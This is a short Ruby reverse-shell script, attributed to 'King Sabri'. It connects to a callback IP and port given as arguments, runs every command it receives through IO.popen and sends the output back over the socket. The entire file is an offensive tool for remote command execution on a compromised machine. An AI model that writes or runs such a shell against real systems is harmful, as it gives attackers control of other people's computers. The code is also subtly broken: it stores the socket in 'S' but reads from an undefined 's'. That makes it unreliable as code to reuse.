#!/usr/bin/env ruby
#King Sabri | extended Surf's Up

require 'socket'

if ARGV[0].nil? || ARGV[1].nil?
	puts "ruby #{__FILE__}.rb [CALLBACK_IP CALLBACK_PORT]\n\n"
	exit
end

ip, port = ARGV
S = TCPSocket.new(ip, port)
while cmd = s.gets
	IO.popen(cmd, "r"){|io|s.print io.read}
end
